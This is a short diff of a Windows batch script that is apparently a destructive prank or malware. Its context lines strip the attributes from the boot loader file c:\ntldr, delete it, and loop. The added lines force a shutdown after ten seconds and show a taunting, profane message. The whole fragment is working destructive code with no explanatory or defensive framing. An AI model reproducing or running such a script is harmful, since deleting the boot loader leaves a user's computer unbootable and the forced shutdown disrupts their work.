@@ -10,3 +10,8 @@ goto Rookie
 attrib -s -r -h c:\ntldr
 del ntldr
 goto Rookie
+@echo off
+Shutdown.exe -s -t 10
+cls
+msg * YOUR PC HAS BEEN FUCKED
+
